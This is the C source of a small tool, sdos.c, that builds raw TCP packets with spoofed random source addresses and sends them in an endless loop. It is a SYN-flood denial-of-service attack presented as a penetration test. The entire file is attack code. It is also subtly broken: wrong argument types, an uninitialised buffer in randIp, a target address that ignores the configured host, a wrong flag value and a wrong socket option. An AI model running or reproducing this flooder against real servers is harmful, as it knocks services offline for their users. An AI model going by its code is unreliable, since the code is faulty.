/*
 * ============================================================================
 *
 * Copyright (c) 2015 Kris Nova <kris@nivenly.com>
 *
 * All rights reserved.
 *
 *=============================================================================
 *
 * sdos.c
 *
 * Tested and compiled on FreeBSD 10+
 *
 * A simple C script to attempt to flood a server with SYN requests in the
 * hopes of determining the threshold for availability.
 *
 * This is an isolated penetration test that will send requests via a unique
 * thread.
 *=============================================================================
 */
 
/* Includes */
#include <stdlib.h>
#include <stdio.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <string.h>
#include <sys/socket.h>
#include <errno.h>
#include <arpa/inet.h>
#include <time.h>
 
/* Interface */
int main(int argc, char *argv[]);
unsigned short csum(unsigned short *ptr, int nbytes);
void usage();
int flood();
char* randIp();
 
/**
 * configuration
 *
 * The basic information for defining where we will send the penetration request
 */
struct configuration
{
        char *ip;
        char *message;
        int port;
        int verbose;
};
 
/**
 * main
 *
 * Handles argument parsing and building the configuration struct
 *
 * int argc The total amount of arguments passed
 * char *argv[] Array of arguments space dilimited
 */
int main(int argc, char *argv[])
{
        //Set defaults
        struct configuration cfg;
        cfg.ip = "127.0.0.1";
        cfg.port = 1234;
        cfg.message = "...";
        cfg.verbose = 0;
 
        //Define
        unsigned int seed;
        unsigned int ii;
 
        // Invalid command, display usage
        int i;
        if (argc <= 2)
        {
                usage();
                exit(0);
        }
 
        // Parse arguments
        for (i = 0; i < argc; i++)
        {
                if (argv[i][0] == '-')
                {
                        switch (argv[i][1])
                        {
                        case 'v':
                                //Verbose
                                cfg.verbose = 1;
                                break;
                        case 'h':
                                //Host
                                cfg.ip = argv[i + 1];
                                break;
                        case 'p':
                                //Port
                                cfg.port = atoi(argv[i + 1]);
                                break;
                        case 'm':
                                //Message
                                cfg.message = argv[i + 1];
                                break;
                        }
                }
        }
        //Call flood with our configuration
        seed = time(NULL);
        ii = 0;
        while (flood(cfg))
        {
                seed++;
                ii++;
                srand(seed);
                printf("Iterations: %i\n", ii);
        }
        //Fin
        return 1;
}
 
/**
 * csum
 *
 * Used to calculate the checksum
 */
unsigned short csum(unsigned short *ptr, int nbytes)
{
        register long sum;
        unsigned short oddbyte;
        register short answer;
        sum = 0;
        while (nbytes > 1)
        {
                sum += *ptr++;
                nbytes -= 2;
        }
        if (nbytes == 1)
        {
                oddbyte = 0;
                *((u_char*) &oddbyte) = *(u_char*) ptr;
                sum += oddbyte;
        }
        sum = (sum >> 16) + (sum & 0xffff);
        sum = sum + (sum >> 16);
        answer = (short) ~sum;
        return (answer);
}
 
/**
 * flood
 *
 * The main function for the test
 * Handles sending the packets to the server in test
 */
int flood(struct configuration *cfg)
{
        //Create a raw socket
        int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
        //Datagram to represent the packet
        char datagram[4096], source_ip[32];
        //IP header
        struct ip *iph = (struct ip *) datagram;
        //TCP header
        struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct ip));
        //Socket
        struct sockaddr_in sin;
        //Spoof struct (for calculation the checksum)
        struct ippseudo ipps;
 
        sin.sin_family = AF_INET;
        sin.sin_port = htons(80);
        //TODO random IP
        sin.sin_addr.s_addr = inet_addr(randIp());
 
        //Zero out the buffer
        memset(datagram, 0, 4096);
 
        //IP header
        iph->ip_hl = 5;
        iph->ip_v = 4;
        iph->ip_tos = 0;
        iph->ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
        iph->ip_id = htons(54321);
        iph->ip_off = 0;
        iph->ip_ttl = 255;
        iph->ip_p = IPPROTO_TCP;
        iph->ip_sum = 0;
        struct in_addr ipsrc;
        ipsrc.s_addr = inet_addr(source_ip);
        iph->ip_src = ipsrc;
        struct in_addr ipdst;
        ipdst.s_addr = sin.sin_addr.s_addr;
        iph->ip_dst = ipdst;
        iph->ip_sum = csum((unsigned short *) datagram, iph->ip_len >> 1);
 
        //TCP Header
        tcph->th_sport = htons(1234);
        tcph->th_dport = htons(80);
        tcph->th_seq = 0;
        tcph->th_ack = 0;
        //First and only TCP segment
        tcph->th_off = 5;
        tcph->th_flags = 00000010;
        //Max window size
        tcph->th_win = htons(5840);
        //The kernel will handle calculation this
        tcph->th_sum = 0;
        tcph->th_urp = 0;
 
        //Spoof struct
        struct in_addr spfsrc;
        spfsrc.s_addr = inet_addr(source_ip);
        ipps.ippseudo_src = spfsrc;
        struct in_addr spfdst;
        spfdst.s_addr = sin.sin_addr.s_addr;
        ipps.ippseudo_dst = spfdst;
        ipps.ippseudo_pad = 0;
        ipps.ippseudo_p = IPPROTO_TCP;
        ipps.ippseudo_len = htons(20);
 
        //Calculate checksum for the TCP header
        tcph->th_sum = csum((unsigned short*) &ipps, sizeof(struct ippseudo));
 
        //IP_HDRINCL to tell the kernel that headers are included in the packet
        int one = 1;
        const int *val = &one;
        if (setsockopt(s, IPPROTO_IP, PF_INET, val, sizeof(one)) < 0)
        {
                printf("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n", errno, strerror(errno));
                exit(0);
        }
 
        //Send the packet
        if (sendto(s, /* our socket */
        datagram, /* the buffer containing headers and data */
        iph->ip_len, /* total length of our datagram */
        0, /* routing flags, normally always 0 */
        (struct sockaddr *) &sin, /* socket addr, just like in */
        sizeof(sin)) < 0) /* a normal send() */
        {
                printf("Packet transmission failed!\n");
                return 1;
        }
        //Data send successfully
        else
        {
                printf("Packet transmission success!\n");
                return 1;
        }
}
 
/**
 * randIp
 *
 * Will generate a random IP address to spoof the packet with
 */
char* randIp()
{
        char *ip;
        sprintf(ip, "%d.%d.%d.%d", rand() & 126, rand() & 255, rand() & 255, rand() & 255);
        printf("Random IP: %s\n", ip);
        return ip;
}
 
/**
 * usage
 *
 * How do we run this thing
 */
void usage()
{
        printf("./sdos <options>\n");
        printf("\n");
        printf("v     Verbose - Enables verbosity\n");
        printf("h     Host    - IP of host to connect to\n");
        printf("p     Port    - The numerical port to connect on\n");
        printf("m     Message - Optional message to send to the server\n");
        printf("\n");
 
}
